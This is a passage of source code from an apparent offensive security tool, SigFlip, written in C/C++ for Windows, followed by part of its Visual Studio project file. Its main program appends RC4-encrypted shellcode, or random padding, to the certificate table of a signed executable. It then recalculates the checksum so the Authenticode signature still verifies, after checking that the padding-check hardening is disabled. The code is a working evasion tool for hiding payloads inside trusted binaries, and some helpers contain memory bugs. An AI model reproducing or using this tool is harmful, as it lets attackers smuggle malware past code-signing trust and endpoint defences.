	return CheckSum + (CheckSum >> 16);
}


unsigned int PEChecksum(void *FileBase, unsigned int FileSize)
{

	void *RemainData;
	int RemainDataSize;
	unsigned int PeHeaderSize;
	unsigned int HeaderCheckSum;
	unsigned int PeHeaderCheckSum;
	unsigned int FileCheckSum;
	PIMAGE_NT_HEADERS NtHeaders;
	
	NtHeaders = ImageNtHeader(FileBase);
	if (NtHeaders)
	{
		HeaderCheckSum = NtHeaders->OptionalHeader.CheckSum;
		PeHeaderSize = (unsigned int)NtHeaders - (unsigned int)FileBase +
			((unsigned int)&NtHeaders->OptionalHeader.CheckSum - (unsigned int)NtHeaders);
		RemainDataSize = (FileSize - PeHeaderSize - 4) >> 1;
		RemainData = &NtHeaders->OptionalHeader.Subsystem;
		PeHeaderCheckSum = ChkSum(0, FileBase, PeHeaderSize >> 1);
		FileCheckSum = ChkSum(PeHeaderCheckSum, RemainData, RemainDataSize);

		if (FileSize & 1)
		{
			FileCheckSum += (unsigned short)*((char *)FileBase + FileSize - 1);
		}
	}
	else
	{
		FileCheckSum = 0;
	}

	return (FileSize + FileCheckSum);
}

char* genKey() {

	char _key[16] = "randomkeyrandom";

	srand(time(NULL));
	
	for (int i = 0; i < 15; ++i) {
		_key[i] = '0' + rand() % 72;
	}
	return _key;
}

char* genRandomBytes(size_t length) {
		srand(time(NULL));
		const char* st = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,.-#'?!";
		size_t sLen = 26 * 2 + 10 + 7;
		char *rStr;

		rStr = (char*) malloc(sizeof(char) * (length + 1));

		if (!rStr) {
			return (char*)0;
		}

		unsigned int key = 0;

		for (int n = 0; n < length; n++) {
			key = rand() % sLen;
			rStr[n] = st[key];
		}

		rStr[length] = '\0';

		return rStr;
}


void *memcopy(void *const dest, void const *const src, size_t bytes){
	while (bytes-- > (size_t)0)
		((unsigned char *)dest)[bytes] = ((unsigned char const *)src)[bytes];

	return dest;
}

char* getFName(char* _fPath) {

	char *sepd = (strrchr(_fPath, '/') != NULL) ? strrchr(_fPath, '/') : strrchr(_fPath, '\\');

	int l_sep, i = 0;
	char sep = sepd[0];
	if (*_fPath) {
		while (_fPath[i++]) if (_fPath[i] == sep) l_sep = i;
		return _fPath[l_sep] == sep ? &_fPath[l_sep + 1] : _fPath;
	}
	return _fPath;
}

void crypt(unsigned char* data, long dataLen, char* key, long keyLen, unsigned char* result){
	unsigned char T[256];
	unsigned char S[256];
	unsigned char  tmp; 
	int j = 0, t = 0, i = 0;


	for (int i = 0; i < 256; i++){
		S[i] = i;
		T[i] = key[i % keyLen];
	}

	for (int i = 0; i < 256; i++){
		j = (j + S[i] + T[i]) % 256;
		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;
	}
	j = 0; 
	for (int x = 0; x < dataLen; x++){
		i = (i + 1) % 256; 
		j = (j + S[i]) % 256; 

		tmp = S[j];
		S[j] = S[i];
		S[i] = tmp;

		t = (S[i] + S[j]) % 256;

		result[x] = data[x] ^ S[t];
	}
}


BOOL Sha1(BYTE* peblob, char* sha1Buf, DWORD dwBufferLen)
{
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;
	BYTE rgbHash[SHA1LEN];
	DWORD cbHash = 0;

	// Get handle to the crypto provider
	if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)){
		return FALSE;
	}

	if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) {
		CryptReleaseContext(hProv, 0);
		return FALSE;
	}

	if (!CryptHashData(hHash, peblob, dwBufferLen, 0)){	
		CryptReleaseContext(hProv, 0);
		CryptDestroyHash(hHash);
		return FALSE;
	}


	cbHash = SHA1LEN;
	if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
		for (DWORD i = 0; i < cbHash; i++) {
			sprintf( sha1Buf + (i * 2), "%02x", rgbHash[i]);
		}
	}
	else {
		return FALSE;
	}

	CryptDestroyHash(hHash);
	CryptReleaseContext(hProv, 0);

	return TRUE;
}


BOOL IsWow64(HANDLE pHandle)
{
	BOOL isWow64 = FALSE;

	typedef BOOL(WINAPI *PFNIsWow64Process) (HANDLE, PBOOL);
	PFNIsWow64Process _FNIsWow64Process;
	_FNIsWow64Process = (PFNIsWow64Process)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

	if (NULL != _FNIsWow64Process){
		if (!_FNIsWow64Process(pHandle, &isWow64)) {}
	}
	return isWow64;
}

void toMultiByte(DWORD strLen, CHAR* _Str, LPWSTR _wStr) {
	DWORD wlen = strLen * 2;
	_wStr = (LPWSTR)malloc(wlen * sizeof(wchar_t));
	mbstowcs(_wStr, _Str, strlen(_Str) + 1);
}


DWORD VerifyPESignature(PCWSTR FileName, HANDLE FileHandle)
{
	DWORD Error = ERROR_SUCCESS;
	bool WintrustCalled = false;
	GUID GenericActionId = WINTRUST_ACTION_GENERIC_VERIFY_V2;
	WINTRUST_DATA WintrustData = {};
	WINTRUST_FILE_INFO FileInfo = {};
	WINTRUST_SIGNATURE_SETTINGS SignatureSettings = {};

	// Setup data structures for calling WinVerifyTrust 
	WintrustData.cbStruct = sizeof(WINTRUST_DATA);
	WintrustData.dwStateAction = WTD_STATEACTION_VERIFY;
	WintrustData.dwUIChoice = WTD_UI_NONE;
	WintrustData.fdwRevocationChecks = WTD_REVOKE_NONE;
	WintrustData.dwUnionChoice = WTD_CHOICE_FILE;

	FileInfo.cbStruct = sizeof(WINTRUST_FILE_INFO_);
	FileInfo.hFile = FileHandle;
	FileInfo.pcwszFilePath = FileName;
	WintrustData.pFile = &FileInfo;

	SignatureSettings.cbStruct = sizeof(WINTRUST_SIGNATURE_SETTINGS);
	SignatureSettings.dwFlags = WSS_GET_SECONDARY_SIG_COUNT | WSS_VERIFY_SPECIFIC;
	SignatureSettings.dwIndex = 0;
	WintrustData.pSignatureSettings = &SignatureSettings;

	Error = WinVerifyTrust(NULL, &GenericActionId, &WintrustData);
	WintrustCalled = true;
	if (Error != ERROR_SUCCESS)
	{
		goto Cleanup;
	}

	// Now attempt to verify all secondary signatures that were found 
	for (DWORD x = 1; x <= WintrustData.pSignatureSettings->cSecondarySigs; x++)
	{

		// Need to clear the previous state data from the last call to WinVerifyTrust 
		WintrustData.dwStateAction = WTD_STATEACTION_CLOSE;
		Error = WinVerifyTrust(NULL, &GenericActionId, &WintrustData);
		if (Error != ERROR_SUCCESS)
		{
			//No need to call WinVerifyTrust again 
			WintrustCalled = false;
			goto Cleanup;
		}

		WintrustData.hWVTStateData = NULL;

		// Caller must reset dwStateAction as it may have been changed during the last call 
		WintrustData.dwStateAction = WTD_STATEACTION_VERIFY;
		WintrustData.pSignatureSettings->dwIndex = x;
		Error = WinVerifyTrust(NULL, &GenericActionId, &WintrustData);
		if (Error != ERROR_SUCCESS)
		{
			goto Cleanup;
		}
	}

Cleanup:

	// Caller must call WinVerifyTrust with WTD_STATEACTION_CLOSE to free memory 
	// allocate by WinVerifyTrust 
	if (WintrustCalled != false)
	{
		WintrustData.dwStateAction = WTD_STATEACTION_CLOSE;
		WinVerifyTrust(NULL, &GenericActionId, &WintrustData);
	}


	return Error;
}





```

`Native/SigFlip/SigFlip/Helper.h`:

```h
#ifndef _HELPER_
#define _HELPER_

#pragma comment(lib, "dbghelp.lib") 

#include <stdio.h>
#include <windows.h>
#include <DbgHelp.h>
#include <time.h>

#include <softpub.h> 

#define SHA1LEN  20

extern unsigned int PEChecksum(void *FileBase, unsigned int FileSize);
extern char* genRandomBytes(size_t length);
extern char* genKey();
extern void *memcopy(void *const dest, void const *const src, size_t bytes);
extern void crypt(unsigned char* data, long dataLen, char* key, long keyLen, unsigned char* result);
extern BOOL IsWow64(HANDLE pHandle);
extern BOOL Sha1(BYTE* peBlob, char* sha1Buf, DWORD dwBufferLen);
extern DWORD VerifyPESignature(PCWSTR FileName, HANDLE FileHandle);
extern void toMultiByte(DWORD strLen, CHAR* _Str, LPWSTR _wStr);
extern char* getFName(char* _fPath);

#endif 
```

`Native/SigFlip/SigFlip/SigFlip.cpp`:

```cpp
#include "pch.h"
#include "SigFlip.h"
#include "Helper.h"

#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <Softpub.h>
#include <wincrypt.h>
#include <wintrust.h>

#pragma comment (lib, "wintrust")


int main(INT argc, CHAR* argv[]) {

	//Parsing arguments
	if (!(argc == 4 || argc == 5 || argc == 6)) {
		usage(argv[0]);
	}

	CHAR _fPath[MAX_PATH_LENGTH] = {};
	CHAR _sPath[MAX_PATH_LENGTH] = {};
	CHAR _oPath[MAX_PATH_LENGTH] = {};
	LPWSTR _fwPath = NULL;
	LPWSTR _owPath = NULL;
	CHAR* _key = NULL;
	DWORD _keySize = 0;


	MODE _mode = BIT_FLIP;
	SIZE_T _ind = 1;

	switch (argv[_ind][1]) {   
	case 'b': _mode = BIT_FLIP; break;
	case 'i': _mode = INJECT; break;
	case 'h': usage(argv[0]); break;
	default:
		usage(argv[0]);
	}

	printf("\n");

	if (_mode == BIT_FLIP) {
		memcpy_s(&_fPath, MAX_PATH_LENGTH, argv[_ind + 1], MAX_PATH_LENGTH);
		memcpy_s(&_oPath, MAX_PATH_LENGTH, argv[_ind + 2], MAX_PATH_LENGTH);
	}
	else {
		if (argc == 5 || argc == 6) {
			memcpy_s(&_fPath, MAX_PATH_LENGTH, argv[_ind + 1], MAX_PATH_LENGTH);
			memcpy_s(&_sPath, MAX_PATH_LENGTH, argv[_ind + 2], MAX_PATH_LENGTH);
			memcpy_s(&_oPath, MAX_PATH_LENGTH, argv[_ind + 3], MAX_PATH_LENGTH);
			if (argc == 6) {
				_keySize = strlen(argv[_ind + 4]);
				_key = (CHAR*)malloc((_keySize + 1) * sizeof(CHAR));
				memcpy_s(_key, _keySize, argv[_ind + 4], _keySize);
			}
		}
		else {
			usage(argv[0]);
		}
	}

	//check config
	if (checkConfig()) {
		fprintf(stderr, "[!]: Endpoint hardened against authenticode signature padding, i.e this won't work %s\n");
		exit(EXIT_FAILURE);
	}

	PIMAGE_DOS_HEADER _dosHeader = {};
	PIMAGE_NT_HEADERS _ntHeader = {};
	IMAGE_OPTIONAL_HEADER _optHeader = {};
	DWORD _CertTableRVA = 0;
	SIZE_T _CertTableSize = 0;
	LPWIN_CERTIFICATE _wCert = {};
	DWORD checksum = 0;
	FILE* _outFile = NULL;
	SIZE_T _writtenBytes = 0;
	CHAR* _data = NULL;
	DWORD _dataSize = 0;
	CHAR* _encryptedData = NULL;
	CHAR* _rpadding = NULL;
	DWORD _fSize = 0;
	VOID* _peBlob = NULL;
	DWORD  _bytesRead = 0;
	HANDLE _fHandle = INVALID_HANDLE_VALUE;
	HANDLE _oHandle = INVALID_HANDLE_VALUE;
	HANDLE _fDataHandle = INVALID_HANDLE_VALUE;
	DWORD _extraPaddingCount = 0;
	CHAR* _extraPadding = NULL;
	DWORD _DT_SecEntry_Offset = 0;
	CHAR* _sha1Hash = NULL;

	//Loading PE File
	printf("[*]:Loading/Parsing PE File '%s'\n\n", _fPath);
	_fHandle = CreateFileA(_fPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		exit(EXIT_FAILURE);
	}

	//Verifying PE file signature
	toMultiByte(strlen(_fPath), _fPath, _fwPath);
	if (VerifyPESignature(_fwPath, _fHandle) == 0) {
		printf("[*]:PE File '%s' is SIGNED\n", _fPath);
	}
	else {
		printf("[*]:PE File '%s' is NOT SIGNED\n", _fPath);
	}

	//Reading PE file
	_fSize = GetFileSize(_fHandle, NULL);
	_rpadding = genRandomBytes(8);
	_mode == BIT_FLIP ? _fSize += strlen(_rpadding) : _fSize = _fSize;
	_peBlob = malloc(_fSize);
	ReadFile(_fHandle, _peBlob, _fSize, &_bytesRead, NULL);


	if (_bytesRead == 0) {
		fprintf(stderr, "[!]: Could not read file %s\n", _fPath);
		goto _Exit;
	}

	_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;

	if (_dosHeader->e_magic != 0x5a4d) {
		fprintf(stderr, "'%s' is not a valid PE file\n", _fPath);
		goto _Exit;
	}

	//Compute Sha1 hash
	_sha1Hash = (char*)malloc(((SHA1LEN * 2) + 1) * sizeof(char));
	if (Sha1((BYTE*)_peBlob, _sha1Hash, GetFileSize(_fHandle, NULL))) {
		printf("[+]:Current PE File '%s' SHA1 Hash is : %s\n", _fPath, _sha1Hash);
	}
	else {
		printf("[!]:Could not compute PE '%s' SHA1 Hash\n", _fPath);
		free(_sha1Hash);
	}


	//Get "e_lfanew" offset (pointing to the PE FILE HEADER -> IMAGE_NT_HEADERS)
	_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);

	//Get IMAGE_OPTIONAL_HEADER from IMAGE_NT_HEADERS
	_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;

	//Security entry seems to be located at the 7th offset (Data_Dir) for For x64 PE files, and the 5th offset for x86 PE files. just a quick workaround to make the script work for different PE archs.
	if (IsWow64(GetCurrentProcess())) {
		if (_optHeader.Magic == 0x20B) {
			_DT_SecEntry_Offset = 2;
		}
	}
	else {
		if (_optHeader.Magic == 0x10B) {
			_DT_SecEntry_Offset = -2;
		}
	}

	//Get IMAGE_DIRECTORY_ENTRY_SECURITY field and retrieve the RVA and SIZE of the Certificate Table (WIN_CERTIFICATE).
	_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
	_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
	_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

	printf("%s", getFName(_fPath));
	printf("%s", getFName(_oPath));
	//Bit Flip and Save file to disk
	if (_mode == BIT_FLIP) {
		printf("[+]:Bit Flipping PE File '%s'\n", _fPath);

		printf("[+]:Padding '%s' with %s of size %d \n", _fPath, _rpadding, strlen(_rpadding));
		//Add padding based on data read from _sPath.
		memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _rpadding, strlen(_rpadding));

		//update dwLength and Cert Table Entry Size.
		printf("[+]:Updating OPT Header Fields/Entries \n");
		_wCert->dwLength += strlen(_rpadding);
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += strlen(_rpadding);

		//update checksum
		printf("[+]:Calculating/Updating the new OPTHeader checksum\n");
		checksum = PEChecksum(_peBlob, _fSize);
		_ntHeader->OptionalHeader.CheckSum = checksum;

		//re-computing the new sha1 hash
		_sha1Hash = (char*)malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, _fSize)) {
			printf("[+]:New PE File '%s' SHA1 Hash is : %s\n", _oPath, _sha1Hash);
		}
		else {
			printf("[!]:Could not compute PE '%s' SHA1 Hash\n", _oPath);
			free(_sha1Hash);
		}

		//save patched PE to disk
		printf("[+]:Saving Bit-flipped PE to '%s'\n", _oPath);
		_outFile = fopen(_oPath, "wb");
		_writtenBytes = fwrite(_peBlob, _fSize, 1, _outFile);
		fclose(_outFile);
	}


	//Inject Data and Save file to disk
	else if (_mode == INJECT) {

		printf("[+]:Injecting Data (sh311code) from '%s' to PE File '%s'\n", _sPath, _fPath);
		_fDataHandle = CreateFileA(_sPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (_fDataHandle == INVALID_HANDLE_VALUE) {
			fprintf(stderr, "[!]: Could not read data file %s\n", _sPath);
			goto _Exit;
		}

		_bytesRead = 0;
		_dataSize = GetFileSize(_fDataHandle, NULL);
		_data = (char*)malloc(_dataSize);
		ReadFile(_fDataHandle, _data, _dataSize, &_bytesRead, NULL);

		if (_bytesRead == 0) {
			fprintf(stderr, "[!]: Empty data file %s\n", _sPath);
			goto _Exit;
		}


		//RC4 encrypt and Tag
		printf("[+]:Encrypting/Encoding Data with size %d\n", _dataSize);
		_encryptedData = (CHAR*)malloc(_dataSize + 8);
		if (_keySize == 0) {
			_key = genKey();
			_keySize = 15;
		}
		memcpy(_encryptedData, "\xFE\xED\xFA\xCE\xFE\xED\xFA\xCE", 8);
		crypt((unsigned char*)_data, _dataSize, _key, _keySize, (unsigned char*)_encryptedData + 8);
		_dataSize += 8;

		//Adjust extra padding
		if ((_fSize + _dataSize) % 8 != 0) {
			while ((_fSize + _dataSize + _extraPaddingCount) % 8 != 0) {
				_extraPaddingCount++;
			}
			_extraPadding = (char*)malloc(_extraPaddingCount + 1);
			sprintf(_extraPadding, "%0*d", _extraPaddingCount, 0);
			_encryptedData = (CHAR*)realloc(_encryptedData, (_dataSize + _extraPaddingCount));
			memcpy(_encryptedData + _dataSize, _extraPadding, _extraPaddingCount);
			_dataSize += _extraPaddingCount;
		}

		//Increasing buffer size
		_peBlob = realloc(_peBlob, (_fSize + _dataSize));

		//Re-initialize structures (_peBlob was reallocated)
		_dosHeader = {};
		_ntHeader = {};
		_wCert = {};
		_dosHeader = (PIMAGE_DOS_HEADER)_peBlob;
		_ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)_peBlob + _dosHeader->e_lfanew);
		_optHeader = (IMAGE_OPTIONAL_HEADER)_ntHeader->OptionalHeader;
		_CertTableRVA = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].VirtualAddress;
		_CertTableSize = _optHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size;
		_wCert = (LPWIN_CERTIFICATE)((BYTE*)_peBlob + _CertTableRVA);

		//Add padding based on data read from _sPath
		memcpy((((BYTE*)_peBlob + _CertTableRVA) + _wCert->dwLength), _encryptedData, _dataSize);

		//update dwLength and Cert Table Entry Size.
		printf("[+]:Updating OPT Header Fields/Entries \n");
		_wCert->dwLength += _dataSize;
		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY + _DT_SecEntry_Offset].Size += _dataSize;

		//update checksum
		printf("[+]:Calculating/Updating the new OPTHeader checksum\n");
		checksum = PEChecksum(_peBlob, _fSize + _dataSize);
		_ntHeader->OptionalHeader.CheckSum = checksum;


		printf("[+]:Encrypted Data Size: %d\n", _dataSize);
		printf("[+]:Extra Padding: %d\n", _extraPaddingCount);
		printf("[+]:Encryption Key: %s\n", _key);

		//re-computing the new sha1 hash
		_sha1Hash = (char*)malloc(((SHA1LEN * 2) + 1) * sizeof(char));
		if (Sha1((BYTE*)_peBlob, _sha1Hash, (_fSize + _dataSize))) {
			printf("[+]:PE File '%s' SHA1 Hash is : %s\n", _oPath, _sha1Hash);
		}
		else {
			printf("[!]:Could not compute PE '%s' SHA1 Hash\n", _oPath);
			free(_sha1Hash);
		}

		//save patched PE to disk
		printf("[+]:Saving Modified PE file to '%s'\n", _oPath);
		_outFile = fopen(_oPath, "wb");
		_writtenBytes = fwrite(_peBlob, (_fSize + _dataSize), 1, _outFile);
		fclose(_outFile);
	}


	//verify modified PE file signature
	_oHandle = CreateFileA(_oPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (_fHandle == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!]: Could not read file %s\n", _oPath);
		exit(EXIT_FAILURE);
	}
	toMultiByte(strlen(_oPath), _oPath, _owPath);
	if (VerifyPESignature(_owPath, _oHandle) == 0) {
		printf("[*]:Modified PE File '%s' is SIGNED (Success)\n", _oPath);
	}
	else {
		printf("[!]:Modified PE File '%s' is NOT SIGNED (FAILURE)\n", _oPath);
	}

	printf("\n[*]:Done\n");


_Exit:
	if (_data) free(_data);
	if (_encryptedData) free(_encryptedData);
	if (_extraPadding) free(_extraPadding);
	if (_peBlob) free(_peBlob);
	if (_sha1Hash) free(_sha1Hash);
	if (_fwPath) free(_fwPath);
	if (_owPath) free(_owPath);
	if (_key) free(_key);
	CloseHandle(_fHandle);
	CloseHandle(_fDataHandle);
	exit(EXIT_SUCCESS);
}

BOOL checkConfig() {

	HKEY _hKey;
	LONG _nResult;
	BOOL _check = FALSE;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"\Software\Wow6432Node\Microsoft\Cryptography\Wintrust\Config",
		0, KEY_READ, &_hKey) == ERROR_SUCCESS || RegOpenKeyEx(HKEY_LOCAL_MACHINE,
			L"\Software\Microsoft\Cryptography\Wintrust\Config", 0, KEY_READ, &_hKey) == ERROR_SUCCESS) {

		DWORD dwType;
		_nResult = RegQueryValueEx(_hKey, L"EnableCertPaddingCheck", NULL, &dwType, NULL, NULL);
		if (_nResult == ERROR_SUCCESS)
			_check = TRUE;
		RegCloseKey(_hKey);
	}

	return _check;
}

void usage(char* _file) {
	fprintf(stderr, "\nUsage: \n\n    [+] Bit Flipping: %s -b [exe/dll file path] [output_file_path (with extension)]\n\n    [+] Inject Shellcode: %s -i [exe/dll file path] [shellcode file path] [output_file_path (with extension)] [Encryption Key]\n", _file, _file);
	exit(EXIT_FAILURE);
}

```

`Native/SigFlip/SigFlip/SigFlip.h`:

```h
#ifndef _SIG_FLIP
#define _SIG_FLIP

#include <stdio.h>
#include <windows.h>
#include <WinTrust.h>
#include <time.h>


enum MODE {
	BIT_FLIP,
	INJECT,
	HELP
};

#define MAX_PATH_LENGTH 255
#define MAX_KEY_SIZE 16

extern void usage(char* _file);
extern BOOL checkConfig();


#endif 
```

`Native/SigFlip/SigFlip/SigFlip.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{8BF7FDAF-5ABF-41C3-BBA8-F92AE6A7C1A2}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>SigFlip</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17134.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;_CRT_SECURE_NO_WARNINGS;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <PrecompiledHeaderFile>pch.h</PrecompiledHeaderFile>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="Helper.h" />
    <ClInclude Include="pch.h" />
    <ClInclude Include="SigFlip.h" />
  </ItemGroup>
  <ItemGroup>
